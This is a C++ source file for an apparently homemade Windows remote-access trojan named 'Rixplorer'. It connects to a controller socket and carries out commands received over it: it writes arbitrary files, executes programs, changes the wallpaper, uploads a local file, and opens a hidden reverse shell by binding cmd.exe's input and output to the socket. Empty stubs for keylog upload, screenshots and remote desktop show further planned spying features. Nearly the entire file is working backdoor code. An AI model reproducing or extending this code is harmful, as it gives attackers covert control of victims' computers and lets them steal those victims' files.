// Rixplorer.cpp : Defines the entry point for the console application.
//

#include "rixplorer.h"
#include "Socket.h"
#include <iostream>
#include <fstream>
#include "Request.h"
#include "Filesystem.h"

using namespace std;
#define BUFFER_SIZE 1024

/* Strings */
#define GENERAL_SUCCESS "Sucessfully executed"
int main(int argc, char* argv[]) {
	Socket *socket = new Socket();
	socket->Connect("127.0.0.1", 37810, BLOCKING);
	string buffer;
	int len;
	Request *request;

	while(socket->isConnected()) {
		request = new Request();
		while(!request->hasHeader() && !request->isFinished()) {
			len = socket->Receive(buffer, BUFFER_SIZE, 0);
			request->push(buffer, len);
			buffer.empty();
		}

		callCommand(request, socket);
		delete request;
	}
	return 0;
}

void callCommand(Request *request, Socket *socket) {
	string command = request->getCommand();
	string buffer;
	int len;
	if (command.compare("echo") == 0) {
		while (!request->isFinished()) {
			len = socket->Receive(buffer, BUFFER_SIZE, 0);
			request->push(buffer, len);
			buffer.empty();
		}

		string dst;
		request->pop(dst);
		cout << dst.data();
	} else if (command.compare("sendfile") == 0) {
		// File descriptor
		FILE *file;

		// Position of the filename separator
		int separatorPos = 0;
		bool bFoundFilename = false;
		bool bWroteFile = false;

		// While package isn't fully received
		while (!bWroteFile) {

			if (!request->isFinished()) {
				len = socket->Receive(buffer, BUFFER_SIZE, 0);
				request->push(buffer, len);
			}

			// Check if we received the filename/filepath yet
			if (!bFoundFilename && (separatorPos = request->buffer.find(";")) != string::npos) {
				// Retrieve the filename
				string filename = request->buffer.substr(0, separatorPos);

				// requestBuffer points to the reference(address) of request->buffer
				string *requestBuffer = &request->buffer;

				// Remove filename and ; from the buffer
				// Set the value of what requestBuffer points to
				*requestBuffer = requestBuffer->substr(separatorPos + 1, 
													requestBuffer->length() - 
													(separatorPos - 1));

				// Set bFoundName for faster checking in the next loop
				bFoundFilename = true;

				// Open the file for binary writing
				file = fopen(filename.c_str(), "wb");
			} else if (!bFoundFilename) {
				continue;
			}

			

			// Pop data from Request buffer
			string data;
			request->pop(data);

			// Write data to file
			fwrite(data.c_str(), sizeof(char), data.length(), file);
			buffer.empty();

			if (request->isFinished()) {
				bWroteFile = true;
			}
		}
		fclose(file);
	} else if(command.compare("wallpaper") == 0) {
		while (!request->isFinished()) {
			len = socket->Receive(buffer, BUFFER_SIZE, 0);
			request->push(buffer, len);
			buffer.empty();
		}

		string filepath;
		request->pop(filepath);
		setWallpaper(filepath);
	} else if(command.compare("shellexec") == 0) {
		while (!request->isFinished()) {
			len = socket->Receive(buffer, BUFFER_SIZE, 0);
			request->push(buffer, len);
			buffer.empty();
		}

		string path;
		request->pop(path);
		bool ret = shellExec(path);

		if (ret) {
			socket->Send(GENERAL_SUCCESS, strlen(GENERAL_SUCCESS));
		}
	} else if(command.compare("reverseshell") == 0) {
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		SOCKET sClient = socket->getSocket();
     
		memset(&si, 0, sizeof(STARTUPINFO));
		si.cb = sizeof(STARTUPINFO);
		si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW | STARTF_USEPOSITION;
		si.wShowWindow = SW_HIDE;
		si.hStdError = si.hStdInput = si.hStdOutput = (HANDLE)sClient;
		si.dwX = GetSystemMetrics(SM_CXSCREEN);
		si.dwY = GetSystemMetrics(SM_CYSCREEN);

		char szSystemDir[MAX_PATH + 1];
		GetSystemDirectory(szSystemDir, MAX_PATH);
		SetCurrentDirectory(szSystemDir);

		CreateProcess(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
		WaitForSingleObject(pi.hProcess, INFINITE);
	} else if(command.compare("downloadfile") == 0) {
		uploadFile(socket);
	}
}

void setWallpaper(string filepath) {
	fstream file(filepath);
	if (file.is_open()) {
		file.close();
		SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID) filepath.c_str(), 0);
	}
}

void shellCmd(string command) {
}

bool shellExec(string path) {
	HINSTANCE hRet = ShellExecute(NULL, "open", path.c_str(), NULL, NULL, SW_SHOWNORMAL);

	// Long value over 32 represents success
	if ((long) hRet > 32) {
		return true;
	}
	return false;
}

void ls(Socket socket) {
	
}

void printScreen() {
}

void playWav() {
}

void uploadKeylog() {
}

void uploadFile(Socket *socket) {
	string file = "C:\\Users\\L\\Desktop\\script.js";
    string buffer, header;
    FILE *pFile = fopen(file.c_str(), "rb");
    // obtain file size:
    fseek (pFile , 0 , SEEK_END);
    long lFileSize = ftell (pFile);
    rewind (pFile);

    // Write header
	char dst[100];
	ltoa(lFileSize, dst, 10);
	header = dst;
	header.append("\n");
    socket->Send((char *)header.c_str(), strlen(header.c_str()));

    int len;
	char *cBuffer = new char[BUFFER_SIZE];
    if (pFile != NULL) {
        while ((len = fread(cBuffer, 1, BUFFER_SIZE, pFile)) > 0) {
            socket->Send(cBuffer, len);
			cBuffer = new char[BUFFER_SIZE];
        }

		delete[] cBuffer;
    }

}

void getUptime() {
}

void remoteDesktop() {
}